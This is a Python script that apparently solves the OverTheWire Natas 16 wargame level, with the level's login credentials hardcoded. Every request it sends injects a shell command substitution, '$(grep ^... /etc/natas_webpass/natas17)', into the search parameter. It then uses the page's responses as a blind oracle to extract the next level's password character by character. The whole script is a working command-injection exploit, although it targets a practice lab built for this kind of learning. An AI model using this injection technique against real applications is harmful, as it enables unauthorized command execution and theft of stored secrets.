import requests

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")
alph = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
flag = ""

while len(flag) < 32:
    for char in alph:
        data = {"needle":f"payload$(grep ^{flag}{char} /etc/natas_webpass/natas17)","submit":"Search"}
        r = requests.get(url=url, params=data, auth=auth)
        if "payload's" not in r.text:
            flag += char
            print(flag)
            break